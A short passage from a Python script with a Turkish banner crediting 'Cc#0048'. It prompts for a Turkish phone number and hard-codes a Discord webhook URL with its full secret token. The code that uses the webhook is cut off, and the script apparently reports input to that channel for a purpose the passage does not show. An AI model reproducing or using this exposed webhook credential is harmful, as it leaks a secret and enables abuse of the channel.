...
print('''
╔═══════════════════════════════════════════╗
 Cc iyi kullanımlar diler ;)
╚═══════════════════════════════════════════╝                                                                                                                            
developed by Cc#0048
''')

numara = int(input("Numarayı giriniz (+90) olmadan: "))
# Webhook URL'sini tanımla
webhook_url = "https://discord.com/api/webhooks/1075370997684899899/2j8PYUhVoKn3dTqE_l9EHUc_LPM4zDRSvt0wDT7cY7stXuqRFF3XweiNqxCj7slC4JHf"
